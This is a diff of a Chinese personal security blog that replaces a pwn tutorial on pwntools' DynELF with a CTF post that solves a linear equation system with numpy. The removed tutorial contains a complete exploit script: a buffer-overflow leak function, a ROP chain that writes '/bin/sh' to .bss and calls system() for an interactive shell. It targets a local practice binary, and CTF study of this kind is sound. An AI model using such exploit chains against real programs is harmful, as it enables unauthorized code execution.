@@ -3,21 +3,20 @@
 <head>
   <meta charset="utf-8">
   
-  <title>pwn学习之DynELF的使用 | YungGong</title>
+  <title>python基于numpy解方程组 | YungGong</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="pwn学习之DynELF的使用">
+  <meta name="description" content="python基于numpy解方程组">
 <meta property="og:type" content="article">
-<meta property="og:title" content="pwn学习之DynELF的使用">
-<meta property="og:url" content="http://yunnigu.dropsec.xyz/2016/11/19/pwn学习之DynELF的使用/index.html">
+<meta property="og:title" content="python基于numpy解方程组">
+<meta property="og:url" content="http://yunnigu.dropsec.xyz/2016/11/28/python基于numpy解方程组/index.html">
 <meta property="og:site_name" content="YungGong">
-<meta property="og:description" content="pwn学习之DynELF的使用">
-<meta property="og:image" content="http://p1.bpimg.com/567571/3762473d4048536f.png">
-<meta property="og:image" content="http://p1.bpimg.com/567571/a96448cc65b852d0.png">
-<meta property="og:updated_time" content="2016-11-28T12:50:31.759Z">
+<meta property="og:description" content="python基于numpy解方程组">
+<meta property="og:image" content="http://p1.bpimg.com/567571/4293ccfd9c572020.png">
+<meta property="og:updated_time" content="2016-11-28T12:50:55.722Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="pwn学习之DynELF的使用">
-<meta name="twitter:description" content="pwn学习之DynELF的使用">
-<meta name="twitter:image" content="http://p1.bpimg.com/567571/3762473d4048536f.png">
+<meta name="twitter:title" content="python基于numpy解方程组">
+<meta name="twitter:description" content="python基于numpy解方程组">
+<meta name="twitter:image" content="http://p1.bpimg.com/567571/4293ccfd9c572020.png">
   
     <link rel="alternative" href="/atom.xml" title="YungGong" type="application/atom+xml">
   
@@ -228,11 +227,11 @@
         </header>                
     </div>
 </nav>
-      <div class="body-wrap"><article id="post-pwn学习之DynELF的使用" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-python基于numpy解方程组" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2016/11/19/pwn学习之DynELF的使用/" class="article-date">
-      <time datetime="2016-11-19T07:54:57.000Z" itemprop="datePublished">2016-11-19</time>
+      <a href="/2016/11/28/python基于numpy解方程组/" class="article-date">
+      <time datetime="2016-11-28T08:12:18.000Z" itemprop="datePublished">2016-11-28</time>
 </a>
     </div>
   
@@ -245,7 +244,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      pwn学习之DynELF的使用
+      python基于numpy解方程组
     </h1>
   
 
@@ -256,7 +255,7 @@
 
         
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li></ul>
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/python/">python</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/reverse/">reverse</a></li></ul>
     </div>
 
         <div class="clearfix"></div>
@@ -266,68 +265,73 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <h1 id="pwn学习之DynELF的使用"><a href="#pwn学习之DynELF的使用" class="headerlink" title="pwn学习之DynELF的使用"></a>pwn学习之DynELF的使用</h1><a id="more"></a>
-<p>本文是针对一步一步学rop之x86篇中的test2的一种memory leak（内存泄漏）的方法，是通过pwntools中DynELF模块来进行内存搜索。在ctf比赛中常常会遇到一种不提供libc.so的题目，都可以利用这样的方法在内存中寻找system()地址。</p>
-<h2 id="0x00-leak函数"><a href="#0x00-leak函数" class="headerlink" title="0x00 leak函数"></a>0x00 leak函数</h2><pre><code>#!python
-def leak(address):
-    payload1 = &apos;a&apos;*140 + p32(plt_write) + p32(vulfun_addr) + p32(1) +p32(address) + p32(4)
-    p.send(payload1)
-    data = p.recv(4)
-    print &quot;%#x =&gt; %s&quot; % (address, (data or &apos;&apos;).encode(&apos;hex&apos;))
-return data
-</code></pre><p>随后将这个函数作为参数再调用d = DynELF(leak, elf=ELF(‘./test2’))就可以对DynELF模块进行初始化了。然后可以通过调用system_addr = d.lookup(‘system’, ‘libc’)来得到libc.so中system()在内存中的地址。</p>
-<h2 id="0x01-寻找地址"><a href="#0x01-寻找地址" class="headerlink" title="0x01 寻找地址"></a>0x01 寻找地址</h2><p>通过DynELF模块只能获取到system()在内存中的地址，但无法获取字符串“/bin/sh”在内存中的地址。所以我们在payload中需要调用read()将“/bin/sh”这字符串写入到程序的.bss段中。.bss段是用来保存全局变量的值的，地址固定，并且可以读可写。所以首先要找到bss段的地址通过readelf -S level2这个命令就可以获取到bss段的地址了。</p>
-<p><img src="http://p1.bpimg.com/567571/3762473d4048536f.png" alt=""></p>
-<p>因为我们在执行完read()之后要接着调用system(“/bin/sh”)，并且read()这个函数的参数有三个，所以我们需要一个pop pop pop ret的gadget用来保证栈平衡。这个gadget非常好找，用objdump就可以轻松找到。</p>
-<p><img src="http://p1.bpimg.com/567571/a96448cc65b852d0.png" alt=""></p>
-<p>最后需要寻找的就是vulfun_add,直接用gdb反编译一下程序就可以了。</p>
-<pre><code>da$ disassemble vlun_fun 
-Dump of assembler code for function vlun_fun:
-   0x0804844d &lt;+0&gt;:    push   ebp
-   0x0804844e &lt;+1&gt;:    mov    ebp,esp
-   0x08048450 &lt;+3&gt;:    sub    esp,0x98
-   0x08048456 &lt;+9&gt;:    mov    DWORD PTR [esp+0x8],0x100
-   0x0804845e &lt;+17&gt;:    lea    eax,[ebp-0x88]
-   0x08048464 &lt;+23&gt;:    mov    DWORD PTR [esp+0x4],eax
-   0x08048468 &lt;+27&gt;:    mov    DWORD PTR [esp],0x0
-   0x0804846f &lt;+34&gt;:    call   0x8048310 &lt;read@plt&gt;
-   0x08048474 &lt;+39&gt;:    leave  
-   0x08048475 &lt;+40&gt;:    ret    
-</code></pre><p>和明显地址是0x0804844d</p>
-<p>0x02 最终的exp</p>
-<p>整个攻击过程如下：首先通过DynELF获取到system()的地址后，我们又通过read将“/bin/sh”写入到.bss段上，最后再调用system（.bss），执行“/bin/sh”。最终的exp如下:</p>
-<pre><code>#!python
-#!/usr/bin/env python
-from pwn import *
-elf = ELF(&apos;./test2&apos;)
-plt_write = elf.symbols[&apos;write&apos;]
-plt_read = elf.symbols[&apos;read&apos;]
-vulfun_addr = 0x0804844d
-
-def leak(address):
-    payload1 = &apos;a&apos;*140 + p32(plt_write) + p32(vulfun_addr) + p32(1) +p32(address) + p32(4)
-    p.send(payload1)
-    data = p.recv(4)
-    print &quot;%#x =&gt; %s&quot; % (address, (data or &apos;&apos;).encode(&apos;hex&apos;))
-    return data
-p = process(&apos;./test2&apos;)
-gdb.attach(p,&quot;b *0x804850d&quot;)
-#p = remote(&apos;127.0.0.1&apos;, 10002)
-d = DynELF(leak, elf=ELF(&apos;./test2&apos;))
-system_addr = d.lookup(&apos;system&apos;, &apos;libc&apos;)
-print &quot;system_addr=&quot; + hex(system_addr)
-bss_addr = 0x0804a024
-pppr = 0x804850d
-payload2 = &apos;a&apos;*140  + p32(plt_read) + p32(pppr) + p32(0) + p32(bss_addr) + p32(8) 
-payload2 += p32(system_addr) + p32(vulfun_addr) + p32(bss_addr)
-payload2 += &apos;C&apos; * (256 - len(payload2))
-#ss = raw_input()
-print &quot;\n###sending payload2 ...###&quot;
-p.send(payload2)
-p.send(&quot;/bin/sh\0&quot;)
-p.interactive()
-</code></pre><p>这个exp在32kali上可以获得权限，在我的64位Ubuntu上无法获得权限，不知道为什么，纠结。。。。。。</p>
-
+        <h1 id="python基于numpy解方程组"><a href="#python基于numpy解方程组" class="headerlink" title="python基于numpy解方程组"></a>python基于numpy解方程组</h1><a id="more"></a>
+<p>前两天在做hctf的时候遇到一个题目，前年的400分，通过IDA分析可以看出就是一个有22个未知数的方程组的求解。</p>
+<p><img src="http://p1.bpimg.com/567571/4293ccfd9c572020.png" alt=""></p>
+<p>看了前年的writeup加上一位大牛的指点，通过numpy这个包写了python脚本，终于得到了flag。</p>
+<pre><code>import sys
+import numpy
+verify=[
+0x83CD50,
+0x706048,
+0xA9AC74,
+0x9A4AF2,
+0x9F79A0,
+0x7F51A2,
+0x7E4CD8,
+0x7038B0,
+0x7B3708,
+0x687078,
+0x806066,
+0x8F2F2E,
+0x928B34,
+0x7FEDDC,
+0x825768,
+0xACB91E,
+0x90402E,
+0x6F7386,
+0xA01C72,
+0x7C7250,
+0x7AB115,
+0x893C38
+]//这一个数组里包含的是方程组的结果
+matrix=[[8923, 659, 1303, 1949, 4447, 3527, 757, 367, 5507, 7907, 691, 9629, 5303, 8117, 9103, 9391, 89, 3361, 751, 9067, 5417, 6829],
+        [9067, 1259, 107, 8597, 4229, 1213, 8831, 3259, 269, 5323, 769, 1237, 5501, 6763, 8053, 67, 3163, 3863, 4447, 5569, 4357, 5503],
+        [9533, 23, 1973, 8269, 6961, 8929, 6301, 2791, 4861, 8053, 1609, 8219, 911, 7583, 6143, 2953, 7247, 6131, 7853, 4451, 7187, 8629],
+        [1039, 389, 1487, 5987, 937, 239, 3583, 2897, 8893, 3307, 7459, 8521, 9769, 9689, 6959, 7949, 9137, 3461, 4229, 9059, 7177, 7643],
+        [7853, 6271, 9371, 1613, 73, 8243, 9013, 919, 5387, 2207, 6211, 139, 5077, 7211, 2053, 8443, 4421, 5717, 8779, 8971, 6337, 7159],
+        [3019, 8377, 1613, 1973, 3923, 8821, 797, 4969, 7643, 7297, 2381, 4679, 5869, 647, 7411, 3329, 6199, 7349, 4969, 8731, 877, 1039],
+        [3089, 9859, 7159, 227, 271, 8161, 1051, 5701, 1259, 1361, 3673, 8311, 4679, 7877, 2621, 991, 9949, 683, 743, 6079, 2473, 4519],
+        [1259, 4651, 5479, 4951, 4657, 4591, 509, 3821, 6661, 4127, 2011, 4547, 7621, 5261, 5261, 2003, 4871, 457, 2083, 4561, 6947, 1187],
+        [4703, 9629, 3769, 2003, 1297, 4283, 2381, 8429, 7057, 9371, 4483, 4099, 1873, 499, 7583, 5897, 937, 727, 241, 4799, 6361, 5531],
+        [283, 5591, 151, 2113, 7229, 307, 3851, 8963, 2777, 7757, 8831, 17, 8563, 1543, 8243, 3529, 3833, 2411, 2897, 19, 3559, 853],
+        [9467, 2207, 2269, 2083, 7741, 5801, 2633, 349, 9257, 479, 331, 7649, 5393, 887, 6329, 4243, 3329, 7121, 4001, 6043, 8263, 3253],
+        [4993, 7577, 6833, 661, 4129, 67, 2791, 3121, 4597, 8053, 8147, 1619, 5801, 6173, 127, 8179, 8093, 9319, 1063, 9157, 7817, 2341],
+        [1493, 9137,9787, 617, 5557, 8387, 4219, 3301, 251, 3203, 8443, 2521, 2887, 2437, 7883, 5653, 3907, 4457, 9091, 523, 887, 8101],
+        [9467, 2251, 9067, 4153,557, 4999, 5669, 9343, 7949, 7019, 113, 1801, 1867, 1187, 3541, 5527, 2347, 4813, 3019, 683, 6869, 5051],
+        [7333, 8677, 3557, 4099, 5279, 449, 2099, 8929, 5393, 1933,9157, 6827, 467, 3299, 443, 3739, 823, 7499, 691, 2467, 281, 4049],
+        [7489,739, 9769, 7963, 5651, 7691, 947, 8537, 4943, 1187, 4651, 9011, 6359, 1063, 7541, 9187, 2551, 7649, 4001, 3187, 6199, 7433],
+        [5653, 9349, 9419, 2459, 2423, 1823, 1291,2423, 3671, 4673, 1033, 8389, 2777, 8629, 6203, 6673, 1877, 7583, 5077, 9227, 6037, 2339],
+        [1663, 3529, 9631, 6833,17, 3697, 4327, 6053, 7639, 6679, 797, 3209, 3191, 3259, 5563, 5717, 3181, 1571, 751, 1163, 211, 4421],
+        [2273, 9341, 8081, 9311, 41, 4241, 1279, 4483, 6581, 6863, 7583, 4129, 1543, 5651, 4357,9521, 5557, 11, 7723, 2441, 6733, 6521],
+        [1171, 241,9851, 3583, 1609, 43, 9281, 5867, 2819, 5659, 4493, 223, 2767, 3221, 6173, 6947, 5897, 6113, 6737, 3989, 9733, 3467],
+        [173, 2099, 2953, 7243, 4987, 1723, 2657, 1213, 2731, 7507, 9721, 4637, 9203, 5407, 3169, 5003, 8681,2, 3329, 5843, 8017, 83],
+        [5119, 3109, 8369, 7993, 2927, 127, 5233, 4783, 5171, 3907, 1613, 4567, 3343, 2617, 5387, 8713, 7829, 3559, 419, 9931, 6067, 4481]
+        ]//这一个数组里包含的是方程组的系数
+print len(matrix)
+for i in matrix:
+    if len(i)==21:
+        print i
+result  = [104,99,116,102,123,83,48,95,84,51,114,114,49,98,49,101,95,73,99,49,49,125]
+if __name__ == &apos;__main__&apos; :
+       #gen_matrix()
+       verify   = numpy.array(verify )
+       matrix   = numpy.array(matrix )
+       print numpy.linalg.solve(matrix,verify)//解方程组
+       #print result
+       for   x in xrange(len(result)):
+              sys.stdout.write(chr(result[x]))
+</code></pre>
       
     </div>
     
@@ -335,13 +339,13 @@ p.interactive()
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2016/11/19/pwn学习之DynELF的使用/">pwn学习之DynELF的使用</a></p>
+        <p><span>本文标题:</span><a href="/2016/11/28/python基于numpy解方程组/">python基于numpy解方程组</a></p>
         <p><span>文章作者:</span><a href="/" title="访问 Yun 的个人博客">Yun</a></p>
-        <p><span>发布时间:</span>2016年11月19日 - 15时54分</p>
+        <p><span>发布时间:</span>2016年11月28日 - 16时12分</p>
         <p><span>最后更新:</span>2016年11月28日 - 20时50分</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2016/11/19/pwn学习之DynELF的使用/" title="pwn学习之DynELF的使用">http://yunnigu.dropsec.xyz/2016/11/19/pwn学习之DynELF的使用/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://yunnigu.dropsec.xyz/2016/11/19/pwn学习之DynELF的使用/　　作者: Yun" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2016/11/28/python基于numpy解方程组/" title="python基于numpy解方程组">http://yunnigu.dropsec.xyz/2016/11/28/python基于numpy解方程组/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yunnigu.dropsec.xyz/2016/11/28/python基于numpy解方程组/　　作者: Yun" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script src="/js/clipboard.min.js"></script>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
@@ -354,18 +358,9 @@ p.interactive()
 
 <nav id="article-nav">
   
-    <a href="/2016/11/21/pwn学习rop之x64篇/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption"><</strong>
-      <div class="article-nav-title">
-        
-          pwn学习rop之x64篇
-        
-      </div>
-    </a>
   
-  
-    <a href="/2016/11/19/pwn学习rop之x86篇/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">pwn学习rop之x86篇</div>
+    <a href="/2016/11/24/reverse之第一更/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">reverse之第一更</div>
       <strong class="article-nav-caption">></strong>
     </a>
   
@@ -376,7 +371,7 @@ p.interactive()
 
     <div id="toc" class="toc-article">
     <strong class="toc-title">文章目录</strong>
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn学习之DynELF的使用"><span class="toc-number">1.</span> <span class="toc-text">pwn学习之DynELF的使用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-leak函数"><span class="toc-number">1.1.</span> <span class="toc-text">0x00 leak函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-寻找地址"><span class="toc-number">1.2.</span> <span class="toc-text">0x01 寻找地址</span></a></li></ol></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#python基于numpy解方程组"><span class="toc-number">1.</span> <span class="toc-text">python基于numpy解方程组</span></a></li></ol>
 </div>
 <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
 
@@ -424,7 +419,7 @@ p.interactive()
     
       <div class="duoshuo" id="comments">
     <!-- 多说评论框 start -->
-    <div class="ds-thread" data-thread-key="2016/11/19/pwn学习之DynELF的使用/" data-title="pwn学习之DynELF的使用" data-url="http://yunnigu.dropsec.xyz/2016/11/19/pwn学习之DynELF的使用/"></div>
+    <div class="ds-thread" data-thread-key="2016/11/28/python基于numpy解方程组/" data-title="python基于numpy解方程组" data-url="http://yunnigu.dropsec.xyz/2016/11/28/python基于numpy解方程组/"></div>
     <!-- 多说评论框 end -->
     <!-- 多说公共JS代码 start (一个网页只需插入一次) -->
     <script type="text/javascript">
@@ -447,13 +442,11 @@ p.interactive()
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2016/11/21/pwn学习rop之x64篇/" title="上一篇: pwn学习rop之x64篇">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
         
-            <a href="/2016/11/19/pwn学习rop之x86篇/" title="下一篇: pwn学习rop之x86篇">
+            <a href="/2016/11/24/reverse之第一更/" title="下一篇: reverse之第一更">
                 <i class="fa fa-angle-right"></i>
             </a>
         
